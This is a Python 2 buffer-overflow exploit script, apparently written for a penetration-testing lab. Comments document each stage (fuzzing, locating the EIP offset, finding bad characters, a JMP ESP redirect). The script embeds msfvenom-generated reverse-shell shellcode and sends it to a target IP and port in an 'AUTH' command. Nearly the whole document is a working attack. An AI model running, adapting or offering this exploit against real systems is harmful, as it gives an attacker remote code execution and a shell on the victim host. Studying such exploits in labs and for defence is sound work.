#!/usr/bin/python
import time, struct, sys, socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# PHASE 1: Confirm fuzzing...
fuzz = 1072
# payload = "A" * fuzz

# PHASE 2: Dial in EIP with pattern_create.rb -l 1072 & pattern_offset.rb -q
# EIP = 37694236
# .../pattern_offset.rb = Exact match at offset 1035
# payload="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6B"
# .../pattern_offset.rb -q 42356942 = Exact match at offset 1040
offset = 1040

# PHASE 3: Confirm control of EIP and space for shellcode/decode
# payload="A" * offset + "B" * 4 + "C" * (fuzz - offset - 4)

# PHASE 4: Pull out bad characters...
BadChars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# \x00 (Null Byte) should never be included and will ternminate the command...
# Other bad chars are typically...
#   \x0a (LN Line Feed), \x0d (CR Carriage Return)
# payload="A" * offset + "B" * 4 + BadChars

# PHASE 5: Redirect Execution Flow: 
# nasm_shell.rb: JMP ESP = FFE4...
# **!!Pick a dll and find jmp esp/FFE4 address!!** = 77C1E871 ? FFE4  JMP ESP
jmpESP="\x71\xe8\xc1\x77"
# payload="A" * offset + jmpESP + "C" * (fuzz - offset - 4 - 4)
# Place a breakpoint at this address to confirm this occurs, or further debug

# PHASE 6: Add Shellcode from msfvenom...
# Note "Payload size:" = 351
shell = 351
# Be sure "Payload size" of shellcode does not exceed expectations
# Take into account encode/decode with noop sleds/slide  before shellcode..."\x90" * 16
# If application is threaded, use EXITFUNC=thread to not crash the app and repeadedly exploit
# msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... --format c --arch x86 
#   EXITFUNC=thread --platform windows --bad-chars "\x00\x0a\x0d" --encoder x86/shikata_ga_nai

reverseshell=("\xba\x4e\xce\x27\x18\xd9\xc4\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x53\x12\x03\x53\x12\x83\xa5\x32\xc5\xed\xc5\x23\x88"
"\x0e\x35\xb4\xed\x87\xd0\x85\x2d\xf3\x91\xb6\x9d\x77\xf7\x3a"
"\x55\xd5\xe3\xc9\x1b\xf2\x04\x79\x91\x24\x2b\x7a\x8a\x15\x2a"
"\xf8\xd1\x49\x8c\xc1\x19\x9c\xcd\x06\x47\x6d\x9f\xdf\x03\xc0"
"\x0f\x6b\x59\xd9\xa4\x27\x4f\x59\x59\xff\x6e\x48\xcc\x8b\x28"
"\x4a\xef\x58\x41\xc3\xf7\xbd\x6c\x9d\x8c\x76\x1a\x1c\x44\x47"
"\xe3\xb3\xa9\x67\x16\xcd\xee\x40\xc9\xb8\x06\xb3\x74\xbb\xdd"
"\xc9\xa2\x4e\xc5\x6a\x20\xe8\x21\x8a\xe5\x6f\xa2\x80\x42\xfb"
"\xec\x84\x55\x28\x87\xb1\xde\xcf\x47\x30\xa4\xeb\x43\x18\x7e"
"\x95\xd2\xc4\xd1\xaa\x04\xa7\x8e\x0e\x4f\x4a\xda\x22\x12\x03"
"\x2f\x0f\xac\xd3\x27\x18\xdf\xe1\xe8\xb2\x77\x4a\x60\x1d\x80"
"\xad\x5b\xd9\x1e\x50\x64\x1a\x37\x97\x30\x4a\x2f\x3e\x39\x01"
"\xaf\xbf\xec\x86\xff\x6f\x5f\x67\xaf\xcf\x0f\x0f\xa5\xdf\x70"
"\x2f\xc6\x35\x19\xda\x3d\xde\x2c\x10\x3d\x3c\x59\x24\x3d\x41"
"\x22\xa1\xdb\x2b\x44\xe4\x74\xc4\xfd\xad\x0e\x75\x01\x78\x6b"
"\xb5\x89\x8f\x8c\x78\x7a\xe5\x9e\xed\x8a\xb0\xfc\xb8\x95\x6e"
"\x68\x26\x07\xf5\x68\x21\x34\xa2\x3f\x66\x8a\xbb\xd5\x9a\xb5"
"\x15\xcb\x66\x23\x5d\x4f\xbd\x90\x60\x4e\x30\xac\x46\x40\x8c"
"\x2d\xc3\x34\x40\x78\x9d\xe2\x26\xd2\x6f\x5c\xf1\x89\x39\x08"
"\x84\xe1\xf9\x4e\x89\x2f\x8c\xae\x38\x86\xc9\xd1\xf5\x4e\xde"
"\xaa\xeb\xee\x21\x61\xa8\x0f\xc0\xa3\xc5\xa7\x5d\x26\x64\xaa"
"\x5d\x9d\xab\xd3\xdd\x17\x54\x20\xfd\x52\x51\x6c\xb9\x8f\x2b"
"\xfd\x2c\xaf\x98\xfe\x64")
payload="A" * offset + jmpESP + "\x90" * 16 + reverseshell + "C" * (fuzz - offset - 4 - 4 - shell - 16)

try:
	IpAddress = str(sys.argv[1])
	port = int(sys.argv[2])
except IndexError:
	print "[+] Usage: python %s 10.11.xx.xx port" % sys.argv[0]
	sys.exit()

try:
	s.connect((IpAddress, port))
	print repr(s.recv(1024))
	s.send("AUTH " + payload + "\r\d")
	print repr(s.recv(1024))
except:
	print "[!] connection refused, check debugger"
	s.close()
